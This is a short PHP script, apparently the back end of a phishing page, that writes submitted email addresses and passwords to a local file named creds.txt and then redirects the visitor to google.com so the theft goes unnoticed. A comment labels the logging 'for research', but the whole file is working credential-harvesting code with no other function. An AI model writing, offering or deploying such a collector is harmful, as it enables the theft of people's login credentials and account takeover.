<?php
// Log credentials for research
file_put_contents('creds.txt', $_POST['email'] . ":" . $_POST['password'] . "\n", FILE_APPEND);
// Redirect to Google
header("Location: https://google.com");
exit();
?>
